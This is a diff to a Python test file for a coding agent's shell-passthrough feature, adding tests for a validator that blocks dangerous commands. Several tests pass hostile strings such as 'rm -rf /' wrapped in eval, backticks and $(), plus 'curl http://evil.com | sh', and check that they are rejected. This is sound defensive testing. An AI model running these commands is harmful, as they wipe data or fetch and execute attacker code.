@@ -11,6 +11,7 @@ from code_puppy.command_line.shell_passthrough import (
     _BANNER_NAME,
     SHELL_PASSTHROUGH_PREFIX,
     _format_banner,
+    _validate_passthrough_command,
     execute_shell_passthrough,
     extract_command,
     is_shell_passthrough,
@@ -266,7 +267,7 @@ class TestExecuteShellPassthrough:
     @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
     @patch("code_puppy.command_line.shell_passthrough._get_console")
     def test_context_hint_shown(self, mock_get_console, mock_run):
-        """A context line should clarify this bypasses the AI."""
+        """A context line should clarify this bypasses the agent."""
         console = self._mock_console()
         mock_get_console.return_value = console
         mock_run.return_value = MagicMock(returncode=0)
@@ -274,7 +275,7 @@ class TestExecuteShellPassthrough:
         execute_shell_passthrough("!echo hi")
 
         second_call = str(console.print.call_args_list[1])
-        assert "Bypassing AI" in second_call
+        assert "Direct shell" in second_call
         assert "safety checks" in second_call
 
     @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
@@ -421,3 +422,100 @@ class TestInitialCommandPassthrough:
 
             # Shell passthrough should NOT have been called
             mock_run.assert_not_called()
+
+
+class TestValidatePassthroughCommand:
+    """Test validation of dangerous command patterns.
+    
+    These tests verify that the shell_passthrough security validation
+    correctly blocks dangerous patterns while allowing benign commands.
+    """
+
+    def test_eval_with_quotes_blocked(self):
+        """`eval "rm -rf /"` should be blocked as dangerous."""
+        is_safe, reason = _validate_passthrough_command('eval "rm -rf /"')
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_backtick_substitution_blocked(self):
+        """Backtick command substitution like `rm -rf /` should be blocked."""
+        is_safe, reason = _validate_passthrough_command("echo `rm -rf /`")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_dollar_paren_substitution_blocked(self):
+        """$(cmd) command substitution like $(rm -rf /) should be blocked."""
+        is_safe, reason = _validate_passthrough_command("echo $(rm -rf /)")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_ls_benign_passes(self):
+        """Benign commands like `ls -la` should pass validation."""
+        is_safe, reason = _validate_passthrough_command("ls -la")
+        assert is_safe is True
+        assert reason == ""
+
+    def test_git_status_benign_passes(self):
+        """Benign commands like `git status` should pass validation."""
+        is_safe, reason = _validate_passthrough_command("git status")
+        assert is_safe is True
+        assert reason == ""
+
+    def test_pipe_benign_passes(self):
+        """Benign piped commands like `cat file.txt | grep foo` should pass."""
+        is_safe, reason = _validate_passthrough_command("cat file.txt | grep foo")
+        assert is_safe is True
+        assert reason == ""
+
+    def test_evaluate_method_not_blocked(self):
+        """`something.evaluate(x)` should NOT be blocked (false-positive fix).
+        
+        The pattern should only match the standalone 'eval' command,
+        not words that contain 'eval' as a substring like 'evaluate'.
+        """
+        is_safe, reason = _validate_passthrough_command("something.evaluate(x)")
+        assert is_safe is True, f"evaluate() should not be blocked, got: {reason}"
+        assert reason == ""
+
+    def test_eval_function_call_blocked(self):
+        """`eval(some_code)` should still be blocked."""
+        is_safe, reason = _validate_passthrough_command("eval(some_code)")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_eval_with_single_quotes_blocked(self):
+        """`eval 'rm -rf /'` should be blocked."""
+        is_safe, reason = _validate_passthrough_command("eval 'rm -rf /'")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_empty_command_rejected(self):
+        """Empty command should be rejected."""
+        is_safe, reason = _validate_passthrough_command("")
+        assert is_safe is False
+        assert "Empty command" in reason
+
+    def test_whitespace_only_command_rejected(self):
+        """Whitespace-only command should be rejected."""
+        is_safe, reason = _validate_passthrough_command("   ")
+        assert is_safe is False
+        assert "Empty command" in reason
+
+    def test_command_too_long_rejected(self):
+        """Commands exceeding MAX_COMMAND_LENGTH should be rejected."""
+        long_command = "x" * 9000  # Exceeds 8192 limit
+        is_safe, reason = _validate_passthrough_command(long_command)
+        assert is_safe is False
+        assert "Command too long" in reason
+
+    def test_rm_rf_root_blocked(self):
+        """`rm -rf /` should be blocked as destructive."""
+        is_safe, reason = _validate_passthrough_command("rm -rf /")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
+
+    def test_curl_pipe_sh_blocked(self):
+        """`curl http://evil.com | sh` should be blocked."""
+        is_safe, reason = _validate_passthrough_command("curl http://evil.com | sh")
+        assert is_safe is False
+        assert "Dangerous pattern detected" in reason
